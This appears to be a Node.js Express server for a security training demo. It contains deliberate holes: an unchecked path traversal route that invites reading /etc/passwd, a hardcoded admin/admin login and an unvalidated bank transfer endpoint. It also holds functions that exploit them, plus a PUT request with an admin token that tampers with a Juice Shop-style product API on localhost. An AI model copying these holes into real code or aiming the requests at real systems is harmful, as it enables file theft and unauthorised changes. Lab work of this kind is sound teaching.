import fetch from 'node-fetch';
import express from 'express';
import fs from 'fs';
import path from 'path';
import puppeteer from 'puppeteer';

const app = express()
const port = 3000

let accounts;

const __filename = new URL(import.meta.url).pathname;
const __dirname = path.dirname(__filename);

app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());


const browser = await puppeteer.launch({
  executablePath: '/usr/bin/google-chrome',
  args: ['--no-sandbox', '--disable-setuid-sandbox'],
});
const page = await browser.newPage();
await page.goto('https://www.example.com');

// Do something on the page

await browser.close();

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

async function defaultCreds() {
  try {
    const response = await fetch('http://localhost:3000/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ username: 'admin', password: 'admin' }),
    });
    if (!response.ok) {
      return `Error: ${response.statusText}`;
    }
    const result = await response.text();
    return result;
  } catch (error) {
    return `Request failed: ${error.message}`;
  }
}

async function pathTraversal() {
  try {
    const response = await fetch('http://localhost:3000/pathtraversal/..%2F..%2F..%2Fsecret.txt');
    if (!response.ok) {
      return `Error: ${response.statusText}`;
    }
    const result = await response.text();
    return result;
  } catch (error) {
    return `Request failed: ${error.message}`;
  }
}


async function productTampering() {
  try {
    const url = 'http://localhost:3001/api/products/9';
    const token = '<eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDEtMjcgMDM6MjI6NTEuMzg0ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDEtMjcgMDM6MjI6NTEuMzg0ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTczNzk1MjAzN30.kP1lvsOFJCpDMrgcXA2qGSPWwFkSB_s13LESiYaYUysZqBVcqyHRu6b066Vpwq5Q6HUhjs75nKf2gE0S9W59IiQ7NnmrM5853jrojUZ_umu9idcZlctfKLj0xKZdU21YPXr-rHJFdF7zEBDr0QFFCO0FH01qdhkHyzBB2dEb46E>';

    const data = {
      id: 9,
      name: 'OWASP SSL Advanced Forensic Tool (O-Saft)',
      description: 'https://owasp.slack.com',
      price: 0.01,
      deluxePrice: 0.01,
      image: 'orange_juice.jpg',
      createdAt: '2025-02-04T01:49:44.737Z',
      updatedAt: '2025-02-04T01:49:44.737Z',
      deletedAt: null
    };

    await fetch(url, {
      method: 'PUT',
      headers: {
        'Host': 'localhost:3001',
        'sec-ch-ua-platform': '"macOS"',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept': 'application/json, text/plain, */*',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'sec-ch-ua-mobile': '?0',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'http://localhost:3001/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cookie': 'language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss',
        'If-None-Match': 'W/"38df-ONSgP9FlHraKcphDrCeZqT5WiEw"',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
      },
      body: JSON.stringify(data)
    }).then(response => response.text())
      .then(result => {
        console.log('Response:\n', result);

      })

    const response2 = await fetch('http://localhost:3001/#/search?q=advanced');
    if (!response2.ok) {
      console.log("??");
      console.log(`Error: ${response2.statusText}`);
    } else {
      console.log("AAA");
      const html = await response2.text();
      console.log("RESPONSE " + html);
      console.log(html);
      return html
    }

  } catch (error) {
    return `Request failed: ${error.message}`;
  }
}



app.post('/exploit', async (req, res) => {
  let { exploitType } = req.body;
  try {
    if (exploitType === "Path Traversal") {
      let result = await pathTraversal();
      res.send(result);
    } else if (exploitType === "Default Credentials") {
      let result = await defaultCreds();
      res.send(result);
    } else if (exploitType === "Software and Data Integrity Failures") {
      let result = await productTampering();
      console.log("RESULT OF CUFNCTIOn " + result)
      res.send(result);
    } else {
      res.send("Strange server error. This exploit doesnt exist.")
    }
  } catch (error) {
    res.send(`Request from server failed: ${error.message}`);
  }

});

app.get('/pathtraversal', (req, res) => {
  res.send("Path traversal vulnerability example. Try to add ..%2F to the url and read a file. Can you read /etc/passwd?")
})

app.get('/pathtraversal/*', (req, res) => {
  let filePath = path.resolve(__dirname + req.params[0]);
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.send("File at " + filePath + " doesn't exist.");
  }
})

app.get('/bank', (req, res) => {
  accounts = { // reset user accounts on refresh
    l33th4x0r: 950,
    john: 5500,
    gary: 2000,
    wendy: 1250,
  };
  res.sendFile(path.join(__dirname, 'public', 'bank.html'));
});

app.post('/bank', (req, res) => {
  let { recipient, amount } = req.body;
  amount = parseInt(amount);
  if (typeof amount === 'number') {
    if (amount > accounts.l33th4x0r) {
      amount = accounts.l33th4x0r;
    }
    accounts.l33th4x0r -= amount;
    accounts[recipient] += amount;
    res.json({ accountInfo: accounts, amountDeducted: amount });
  }
  else {
    res.send("Invalid data")
  }
});

app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/login', (req, res) => {
  let { username, password } = req.body;
  if (username === 'admin' && password === 'admin') {
    res.sendFile(path.join(__dirname, 'public', 'success.html'));
  } else {
    res.sendFile(path.join(__dirname, 'public', 'failed.html'));
  }
});

app.listen(port, () => {
  console.log(`Fully Secure app listening on port ${port}`)
})